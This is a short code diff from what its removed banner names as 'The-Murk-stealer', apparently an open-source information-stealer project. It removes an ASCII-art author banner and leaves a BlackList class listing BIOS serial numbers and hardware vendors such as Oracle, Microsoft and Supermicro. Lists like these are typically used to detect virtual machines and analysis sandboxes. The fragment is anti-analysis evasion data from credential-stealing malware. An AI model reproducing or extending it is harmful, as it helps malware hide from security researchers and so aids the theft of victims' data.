@@ -1,15 +1,3 @@
-#-----------------------------------------------------------------------------#
-#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
-#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
-#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
-#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
-#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
-#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
-#                             by: Nick_Vinesmoke                              #
-#                      https://github.com/Nick-Vinesmoke                      #
-#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
-#-----------------------------------------------------------------------------#
-
 class BlackList:
     Bios = ['1111-2222-3333-4444-5555-6666-77', '23N3POYYY1', '3198-9985-5799-7712-2227-9299-33', '91o2Vzn', 'BVE12AKCEN', 'G8RSDBDNAE', 'H8EDC23SF3', 'nebwazhere-33461537510662145672765213630', 'S215027X9C26307', 'XT6AC1LSV7', 'F2050F0', 'A1B7R1ZEOG', 'QQQ978886578', 'S215027X9C26348', 'YYSTYVFWKS', 'C4TV6M26H9', 'S215027X9C26320', 'ASTIBZI', 'O58YKASVDF', '4HPAOU8EFS', '7Z7YWZGY1O', 'S215027X0421568', 'GWSESTVRYZ', '8966-6471-0414-5159-3855-4982-24', 'XAXOXCE8BK', '9O2WNWVP6M', '9QJZLY49', '2HZW8GMKZX', '5YLKP33LS6', 'FR2PNHNUM9', '4BWNP53ZYP', 'MF6CZOFL']
     Manufacture = ['ASUSTeK Computer Inc.', ' Dell Inc.', ' Microsoft Corporation', ' nebwazhere-33461537510662145672765213630', ' Oracle Corporation', ' R5H7R4S3OL', ' UFU9G5U1VL', ' X7GYTD2PKH', ' ZH24B4O9K6', ' ', ' G31UHK6XGS', ' Supermicro', ' ATFTPBZWYL', ' 7VOMLW7PUX', ' 4PR61MC4SC', ' MH4NDNH3C6', ' 8KBCLP6AC4', ' 89254YMATF', ' SK1YOPWFXV', ' FA4KL3X3DG', ' Gumstix', ' Sapphire Technology', ' S2SHWDMD19', ' CMU6TC3EPZ', ' SSH2Z5OX4K']
